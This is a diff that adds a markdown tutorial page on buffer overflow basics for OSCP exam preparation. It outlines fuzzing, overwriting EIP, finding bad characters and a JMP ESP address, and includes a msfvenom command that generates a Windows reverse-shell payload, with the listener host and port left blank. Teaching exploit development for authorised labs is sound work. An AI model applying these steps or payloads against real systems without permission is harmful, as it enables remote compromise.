@@ -1,0 +1,78 @@
+---
+title: "Buffer Overflow Basics"
+description: "Introduction to buffer overflow exploits and OSCP techniques"
+category: "OSCP"
+order: 1
+tags: ["buffer-overflow", "oscp", "exploitation"]
+updated: 2025-01-15
+---
+
+# Buffer Overflow Basics
+
+Buffer overflows are a classic exploitation technique that you'll encounter frequently in OSCP labs and exams.
+
+## What is a Buffer Overflow?
+
+A buffer overflow occurs when a program writes more data to a buffer than it can hold, causing the excess data to overflow into adjacent memory locations. This can lead to:
+
+- Program crashes
+- Memory corruption
+- Arbitrary code execution
+
+## Basic Steps
+
+### 1. Fuzzing
+Find the offset that causes the crash:
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
+```
+
+### 2. Controlling EIP
+Find the exact position where EIP is overwritten:
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386f4237
+```
+
+### 3. Finding Bad Characters
+Identify characters that break the exploit:
+
+```python
+badchars = (
+  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+  # ... more bad chars
+)
+```
+
+### 4. Finding a JMP ESP
+Find a reliable address to jump to:
+
+```bash
+msf-nasm_shell
+nasm> jmp esp
+# Use the output in !mona modules
+```
+
+### 5. Generating Payload
+Create your shellcode:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -f c -b "\x00"
+```
+
+## Quick Tips
+
+- Always use `!mona` commands in Immunity Debugger
+- Save your exploit templates for reuse
+- Test each component individually
+- Document your offsets and bad characters
+
+## Resources
+
+- OSCP Buffer Overflow Guide
+- Corelan Team Exploit Development Tutorial
+- SANS Penetration Testing Course
+
+> **Warning:** Only practice buffer overflows on systems you own or have explicit permission to test.
